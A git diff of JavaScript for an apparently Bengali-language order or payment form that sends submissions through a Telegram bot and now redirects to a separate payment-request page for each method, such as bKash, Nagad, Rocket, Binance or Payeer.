@@ -57,18 +57,32 @@ const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatI
 
 fetch(url)
     .then((response) => {
-        if (response.ok) {
-            window.location.href = "success.html";
-        } else {
-            alert("কিছু সমস্যা হয়েছে। আবার চেষ্টা করুন।");
-        }
-    })
-    .catch((error) => {
-        console.error("Error:", error);
-        alert("সার্ভার সমস্যার জন্য অনুরোধ পাঠানো যায়নি।");
-    });
-
-});
+            if (response.ok) {
+                // পেমেন্ট মেথড অনুযায়ী ভিন্ন ভিন্ন সাকসেস পেজে রিডাইরেক্ট
+                const paymentMethod = document.getElementById("paymentMethod").value.toLowerCase();
+                let successPage = "success.html"; // ডিফল্ট সাকসেস পেজ
+                
+                if (paymentMethod.includes("bkash")) {
+                    successPage = "payment-request-page/bkash.html";
+                } else if (paymentMethod.includes("binance")) {
+                    successPage = "payment-request-page/binance.html";
+                } else if (paymentMethod.includes("nagad")) {
+                    successPage = "payment-request-page/nagad.html";
+                } else if (paymentMethod.includes("rocket")) {
+                    successPage = "payment-request-page/rocket.html";
+                } else if (paymentMethod.includes("payeer")) {
+                    successPage = "payment-request-page/payeer.html";
+                }
+                
+                window.location.href = successPage;
+            } else {
+                alert("কিছু সমস্যা হয়েছে। আবার চেষ্টা করুন।");
+            }
+        })
+        .catch(error => {
+            console.error("Error:", error);
+            alert("সার্ভার সমস্যার জন্য অনুরোধ পাঠানো যায়নি।");
+        });
 
 document.getElementById("paymentMethod").addEventListener("change", function () { const paymentMethod = this.value; const paymentNumberLabel = document.querySelector('label[for="paymentNumber"]');
 
